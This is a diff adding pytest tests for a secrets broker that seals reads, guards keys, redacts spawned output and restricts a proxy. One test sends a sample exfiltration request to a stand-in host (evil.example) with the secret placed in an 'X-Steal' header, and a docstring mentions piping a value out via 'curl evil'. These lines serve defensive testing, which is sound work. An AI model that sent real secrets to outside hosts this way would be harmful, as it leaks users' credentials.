@@ -30,6 +30,7 @@ import passbook_broker  # noqa: E402
 # is where that judgement lives, so a platform without either says so once.
 pytestmark = broker_marker()
 import passbook_stamp  # noqa: E402
+from _platform import needs_a_posix_shell  # noqa: E402
 
 REPO = Path(__file__).resolve().parents[1]
 # setuptools looks here too; see package-dir in pyproject.toml.
@@ -527,3 +528,95 @@ def test_a_notification_never_carries_a_value(monkeypatch):
     blob = " ".join(said)
     assert "ALPHA" in blob, "the key name is the point of the banner"
     assert "some-agent" in blob
+
+
+# ── grants: values that leave only inside a process the broker started ──────
+
+
+def test_sealed_reads_refuse_a_caller_the_broker_did_not_start(broker):
+    """The switch that makes the guarantee. Nothing is returned to an unplaced
+    caller — and the refusal has to name the way through, or whoever hits it
+    goes looking for the store file instead."""
+    passbook_broker.write_policy({"default": {"mode": "always"}, "apps": {}, "reads": "sealed"})
+    answer = passbook_broker._ask({"op": "request", "app": "some-agent", "keys": ["ALPHA"]})
+    assert answer["granted"] == {}
+    assert "ALPHA" in answer["denied"]
+    assert "passbook run" in answer["why"]["ALPHA"]
+
+
+def test_a_guarded_key_is_refused_even_with_reads_open(broker):
+    """Guarding one key must not require sealing the whole machine — otherwise
+    protecting a wallet secret means breaking every unrelated tool at once."""
+    policy = passbook_broker.read_policy()
+    policy["guards"] = {"ALPHA": {"commands": ["true *"]}}
+    passbook_broker.write_policy(policy)
+    answer = passbook_broker._ask({"op": "request", "app": "some-agent",
+                                   "keys": ["ALPHA", "BETA"]})
+    assert "ALPHA" in answer["denied"]
+    assert answer["granted"].get("BETA") == "b-value"  # unguarded keys unaffected
+
+
+@needs_a_posix_shell
+def test_spawn_gives_the_child_the_value_and_the_caller_the_output(broker):
+    answer = passbook_broker._ask({
+        "op": "spawn", "app": "some-agent", "keys": ["ALPHA"],
+        "command": ["sh", "-c", 'test "$ALPHA" = "a-value" && echo MATCHED; echo $ALPHA'],
+    }, timeout=30)
+    assert answer["ok"] and answer["exit_code"] == 0
+    assert "MATCHED" in answer["stdout"]
+    assert "a-value" not in answer["stdout"]
+    assert "[redacted:ALPHA]" in answer["stdout"]
+
+
+@needs_a_posix_shell
+def test_spawn_honours_a_command_binding(broker):
+    """A guarded key goes into the commands its owner named and no others.
+    Without this, spawn is a prettier `get`: the caller picks `curl evil` and
+    the value leaves by the front door while we scrub an empty stdout."""
+    policy = passbook_broker.read_policy()
+    policy["guards"] = {"ALPHA": {"commands": ["sh -c allowed*"]}}
+    passbook_broker.write_policy(policy)
+    refused = passbook_broker._ask({
+        "op": "spawn", "app": "some-agent", "keys": ["ALPHA"],
+        "command": ["sh", "-c", "denied; echo ${ALPHA:-absent}"]}, timeout=30)
+    assert "ALPHA" in refused["denied"]
+    assert "absent" in refused["stdout"]
+
+
+def test_a_grant_token_cannot_widen_beyond_what_it_was_given(broker):
+    """Otherwise the token is a credential of its own: steal it once and read
+    the whole store forever."""
+    started = passbook_broker._ask({
+        "op": "spawn", "app": "some-agent", "keys": ["ALPHA"],
+        "command": ["sh", "-c", "true"]}, timeout=30)
+    assert started["ok"]
+    grants = passbook_broker._ask({"op": "grants"})["grants"]
+    assert grants and grants[0]["keys"] == ["ALPHA"]
+
+
+def test_proxy_refuses_a_key_with_no_destination(broker):
+    """The one default that is closed. An open one would be an exfiltration
+    primitive with a friendly name."""
+    answer = passbook_broker._ask({
+        "op": "proxy", "app": "some-agent", "url": "https://evil.example/collect",
+        "headers": {"X-Steal": "{{ALPHA}}"}}, timeout=30)
+    assert not answer["ok"]
+    assert "ALPHA" in answer["denied"]
+
+
+def test_reads_mode_defaults_to_open_so_an_upgrade_does_not_brick_a_machine(broker):
+    assert passbook_broker.reads_mode(passbook_broker.read_policy()) == "open"
+
+
+@needs_a_posix_shell
+def test_a_secret_written_into_the_command_is_not_echoed_back_by_grants(broker):
+    """`curl -H "Bearer sk-…"` is the shape half the internet's examples use, so
+    a value in argv is not a hypothetical. `grants` and the ledger are the two
+    surfaces whose whole promise is that they never contain one."""
+    answer = passbook_broker._ask({
+        "op": "spawn", "app": "some-agent", "keys": ["ALPHA"],
+        "command": ["sh", "-c", "echo using a-value now"]}, timeout=30)
+    assert answer["ok"]
+    shown = json.dumps(passbook_broker._ask({"op": "grants"}))
+    assert "a-value" not in shown
+    assert "[redacted:ALPHA]" in shown
